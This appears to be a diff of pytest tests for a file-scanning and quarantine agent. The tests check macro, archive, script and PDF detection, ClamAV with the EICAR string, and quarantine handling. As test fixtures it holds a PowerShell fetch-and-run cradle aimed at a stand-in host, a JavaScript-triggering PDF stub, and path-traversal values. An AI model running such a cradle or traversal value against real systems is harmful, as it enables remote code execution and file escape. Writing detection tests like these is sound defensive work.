@@ -139,29 +139,34 @@ from mst_agent.scanner import ScanError, scan_file  # noqa: E402
 
 
 def rules(result):
-    return {finding["rule"]: finding["severity"] for finding in result["findings"]}
+    return {finding["rule"]: finding["severity"] for finding in result["indicators"]}
+
+
+def scan(path, folders, expected=None, engines=()):
+    return scan_file(path, folders, expected, 10_000, list(engines), 30)
 
 
 def test_scan_plain_document_is_clean(tmp_path):
     target = tmp_path / "report.pdf"
     target.write_bytes(b"%PDF-1.7 demo")
-    result = scan_file(target, [tmp_path], hashlib.sha256(b"%PDF-1.7 demo").hexdigest(), 10_000)
-    assert result["findings"] == [] and result["fileSize"] == 13
+    result = scan(target, [tmp_path], hashlib.sha256(b"%PDF-1.7 demo").hexdigest())
+    assert result["indicators"] == [] and result["fileSize"] == 13 and result["engines"] == []
+    assert result["fileType"] == {"family": "pdf", "label": "PDF document", "extension": "pdf", "extensionMatches": True}
 
 
 def test_scan_flags_double_extension_and_disguised_program(tmp_path):
     fake_pdf = tmp_path / "grades.pdf.exe"
     fake_pdf.write_bytes(b"MZ" + b"\0" * 100)
-    assert rules(scan_file(fake_pdf, [tmp_path], None, 10_000)) == {"double_extension": "HIGH", "executable_type": "LOW"}
+    assert rules(scan(fake_pdf, [tmp_path])) == {"double_extension": "HIGH"}
     renamed_program = tmp_path / "photo.jpg"
     renamed_program.write_bytes(b"MZ" + b"\0" * 100)
-    assert rules(scan_file(renamed_program, [tmp_path], None, 10_000)) == {"disguised_executable": "HIGH"}
+    assert rules(scan(renamed_program, [tmp_path])) == {"disguised_executable": "HIGH"}
 
 
 def test_scan_reports_changed_content(tmp_path):
     target = tmp_path / "notes.txt"
     target.write_text("new content", encoding="utf-8")
-    assert rules(scan_file(target, [tmp_path], "0" * 64, 10_000)) == {"hash_changed": "INFO"}
+    assert rules(scan(target, [tmp_path], "0" * 64)) == {"hash_changed": "INFO"}
 
 
 def test_scan_refuses_missing_files_and_paths_outside_watch_folders(tmp_path):
@@ -170,11 +175,11 @@ def test_scan_refuses_missing_files_and_paths_outside_watch_folders(tmp_path):
     secret = outside / "secret.txt"
     secret.write_text("x", encoding="utf-8")
     with pytest.raises(ScanError):
-        scan_file(secret, [watched], None, 10_000)
+        scan(secret, [watched])
     with pytest.raises(ScanError):
-        scan_file(watched / "gone.exe", [watched], None, 10_000)
+        scan(watched / "gone.exe", [watched])
     with pytest.raises(ScanError):
-        scan_file(watched / ".." / "outside" / "secret.txt", [watched], None, 10_000)
+        scan(watched / ".." / "outside" / "secret.txt", [watched])
 
 
 # ---- fixes from the code check -----------------------------------------------------------------------
@@ -262,7 +267,7 @@ class FakeClient:
         raise self.error
 
     def scan_jobs(self):
-        return []
+        return [], []
 
     def send_scan_result(self, result):
         self.calls += 1
@@ -273,21 +278,21 @@ def test_permanently_rejected_events_and_results_do_not_block_the_queue(tmp_path
     agent = Agent(load_config(write_config(tmp_path)))
     agent.outbox.put({"uid": "x"})
     agent.client = FakeClient(ApiError("Validation failed", 422))
-    agent._unsent_results.append({"scanId": 1})
+    agent._unsent.append(("scan", {"scanId": 1}))
     agent.flush()
     agent.process_scan_jobs()
-    assert len(agent.outbox) == 0 and agent._unsent_results == []
+    assert len(agent.outbox) == 0 and agent._unsent == []
 
     # Temporary problems (server down, 500, wrong token) keep everything for a retry.
     for error in (ApiError("down"), ApiError("server error", 500), ApiError("token", 401)):
         agent.outbox.put({"uid": "y"})
-        agent._unsent_results.append({"scanId": 2})
+        agent._unsent.append(("scan", {"scanId": 2}))
         agent.client = FakeClient(error)
         agent.flush()
         agent.process_scan_jobs()
-        assert len(agent.outbox) == 1 and len(agent._unsent_results) == 1
+        assert len(agent.outbox) == 1 and len(agent._unsent) == 1
         agent.outbox.remove([row_id for row_id, _ in agent.outbox.peek()])
-        agent._unsent_results.clear()
+        agent._unsent.clear()
     agent.outbox.close()
 
 
@@ -300,3 +305,149 @@ def test_tls_ca_bundle_must_exist_and_is_used(tmp_path):
     from mst_agent.api_client import ApiClient
     assert ApiClient(config).session.verify == str(tmp_path / "lab-ca.pem")
     assert ApiClient(load_config(write_config(tmp_path))).session.verify is True
+
+
+# ---- Phase 13: real scanner (static analysis, antivirus engines, quarantine, file activity) ---------------
+import shutil as _shutil  # noqa: E402
+import zipfile  # noqa: E402
+
+from mst_agent import antivirus  # noqa: E402
+from mst_agent.analysis import identify  # noqa: E402
+from mst_agent.quarantine import Quarantine, QuarantineError  # noqa: E402
+
+EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+
+
+def test_static_analysis_finds_macros_programs_in_archives_scripts_and_active_pdfs(tmp_path):
+    with zipfile.ZipFile(tmp_path / "report.docm", "w") as archive:
+        archive.writestr("[Content_Types].xml", "<Types/>")
+        archive.writestr("word/vbaProject.bin", "VBA")
+    with zipfile.ZipFile(tmp_path / "tools.zip", "w") as archive:
+        archive.writestr("setup.exe", "MZ")
+    (tmp_path / "update.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')", encoding="utf-8")
+    (tmp_path / "lesson.pdf").write_bytes(b"%PDF-1.4 << /OpenAction << /S /JavaScript /JS (x) >> >>")
+    (tmp_path / "notes.pdf").write_text("just text", encoding="utf-8")
+    assert identify(tmp_path / "report.docm")["family"] == "ooxml"
+    assert rules(scan(tmp_path / "report.docm", [tmp_path])) == {"office_macros": "MEDIUM"}
+    assert rules(scan(tmp_path / "tools.zip", [tmp_path])) == {"archive_executable": "MEDIUM"}
+    assert rules(scan(tmp_path / "update.ps1", [tmp_path]))["suspicious_script"] == "MEDIUM"
+    assert rules(scan(tmp_path / "lesson.pdf", [tmp_path])) == {"pdf_active_content": "MEDIUM"}
+    assert rules(scan(tmp_path / "notes.pdf", [tmp_path])) == {"type_mismatch": "MEDIUM"}
+
+
+def test_engines_none_and_missing_engines(tmp_path):
+    assert antivirus.engines_status("none") == []
+    status = antivirus.engines_status("clamav", clamav="/nonexistent/clamscan")
+    assert status[0]["available"] is False and "not installed" in status[0]["detail"]
+    (tmp_path / "x.txt").write_text("x", encoding="utf-8")
+    result = scan(tmp_path / "x.txt", [tmp_path], engines=status)
+    assert result["engines"][0]["result"] == "unavailable"
+
+
+@pytest.mark.skipif(not _shutil.which("clamscan"), reason="ClamAV is not installed")
+def test_clamav_detects_the_eicar_test_file(tmp_path):
+    database = tmp_path / "db"
+    database.mkdir()
+    (database / "test.hdb").write_text(f"{hashlib.md5(EICAR).hexdigest()}:{len(EICAR)}:Eicar-Test-Signature\n", encoding="utf-8")
+    antivirus._info_cache.clear()
+    engines = antivirus.engines_status("clamav", clamav_database=str(database))
+    assert engines[0]["available"] and engines[0]["version"]
+    (tmp_path / "eicar.com").write_bytes(EICAR)
+    (tmp_path / "clean.txt").write_text("hello", encoding="utf-8")
+    detected = scan(tmp_path / "eicar.com", [tmp_path], engines=engines)["engines"][0]
+    assert detected["result"] == "detected" and detected["signature"].startswith("Eicar-Test-Signature")
+    assert scan(tmp_path / "clean.txt", [tmp_path], engines=engines)["engines"][0]["result"] == "clean"
+
+
+def test_quarantine_release_and_delete_verify_the_file(tmp_path):
+    watched, vault = tmp_path / "watched", tmp_path / "quarantine"
+    watched.mkdir()
+    target = watched / "invoice.pdf.exe"
+    target.write_bytes(b"MZ evil")
+    digest = hashlib.sha256(b"MZ evil").hexdigest()
+    quarantine = Quarantine(vault, [watched], 10_000)
+    with pytest.raises(QuarantineError, match="changed"):
+        quarantine.quarantine(7, str(target), "0" * 64)
+    name = quarantine.quarantine(7, str(target), digest)
+    assert not target.exists() and (vault / name).exists() and name == f"7-{digest[:16]}.quarantined"
+    assert quarantine.quarantine(7, str(target), digest) == name          # a retried request is safe
+    quarantine.release(name, str(target), digest)
+    assert target.read_bytes() == b"MZ evil" and not (vault / name).exists()
+    name = quarantine.quarantine(8, str(target), digest)
+    target.write_bytes(b"new file with the same name")
+    with pytest.raises(QuarantineError, match="same name"):
+        quarantine.release(name, str(target), digest)
+    quarantine.delete(name, digest)
+    quarantine.delete(name, digest)                                         # already deleted: still fine
+    assert list(vault.iterdir()) == []
+    with pytest.raises(QuarantineError, match="Invalid"):
+        quarantine.delete("../../watched/invoice.pdf.exe", digest)
+    outside = tmp_path / "outside.exe"
+    outside.write_bytes(b"MZ")
+    with pytest.raises(QuarantineError, match="outside"):
+        quarantine.quarantine(9, str(outside), hashlib.sha256(b"MZ").hexdigest())
+
+
+def test_quarantine_folder_cannot_be_inside_a_watch_folder(tmp_path):
+    with pytest.raises(ConfigError, match="quarantine_folder"):
+        load_config(write_config(tmp_path, quarantine_folder=str(tmp_path / "watched" / "q")))
+
+
+def test_monitor_reports_renames_real_modifications_and_browser_downloads(tmp_path, monkeypatch):
+    monkeypatch.setattr(file_monitor, "CHECK_INTERVAL", 0.2)
+    watched = tmp_path / "watched"
+    watched.mkdir()
+    events = []
+    monitor = FileMonitor(load_config(write_config(tmp_path)), events.append)
+    monitor.start()
+    try:
+        (watched / "draft.txt").write_text("one", encoding="utf-8")
+        assert wait_for(events, lambda e: e["type"] == "created" and e["fileName"] == "draft.txt")
+        assert events[0]["origin"] == "local" and events[0]["previousPath"] is None
+        (watched / "draft.txt").rename(watched / "final.txt")
+        renamed = wait_for(events, lambda e: e["type"] == "renamed")
+        assert renamed and renamed[0]["previousPath"] == str(watched / "draft.txt") and renamed[0]["sha256"] == hashlib.sha256(b"one").hexdigest()
+        (watched / "final.txt").write_text("two", encoding="utf-8")
+        modified = wait_for(events, lambda e: e["type"] == "modified")
+        assert modified and modified[0]["sha256"] == hashlib.sha256(b"two").hexdigest()
+        partial = watched / "setup.exe.crdownload"
+        partial.write_bytes(b"x" * 100)
+        partial.rename(watched / "setup.exe")
+        download = wait_for(events, lambda e: e["fileName"] == "setup.exe")
+        assert download and download[0]["type"] == "created" and download[0]["origin"] == "browser_download"
+        monitor.suppress(watched / "setup.exe")
+        (watched / "setup.exe").unlink()
+        time.sleep(1.0)
+    finally:
+        monitor.stop()
+    assert len([e for e in events if e["type"] == "modified"]) == 1
+    assert not [e for e in events if e["type"] == "deleted"]
+
+
+class ActionClient(FakeClient):
+    def __init__(self, actions):
+        super().__init__(None)
+        self.actions, self.results = actions, []
+
+    def scan_jobs(self):
+        return [], self.actions
+
+    def send_action_result(self, result):
+        self.results.append(result)
+
+
+def test_agent_carries_out_quarantine_actions_and_reports_them(tmp_path):
+    watched = tmp_path / "watched"
+    watched.mkdir()
+    target = watched / "tool.exe"
+    target.write_bytes(b"MZ")
+    digest = hashlib.sha256(b"MZ").hexdigest()
+    agent = Agent(load_config(write_config(tmp_path)))
+    agent.client = ActionClient([{"itemId": 3, "action": "quarantine", "originalPath": str(target), "sha256": digest, "quarantineName": None},
+                                 {"itemId": 4, "action": "delete", "originalPath": str(target), "sha256": digest, "quarantineName": "../x"}])
+    assert agent.process_scan_jobs() == 2
+    first, second = agent.client.results
+    assert first == {"itemId": 3, "action": "quarantine", "outcome": "completed", "quarantineName": f"3-{digest[:16]}.quarantined"}
+    assert second["outcome"] == "failed" and "Invalid" in second["error"]
+    assert not target.exists() and (tmp_path / "quarantine" / first["quarantineName"]).exists()
+    agent.outbox.close()
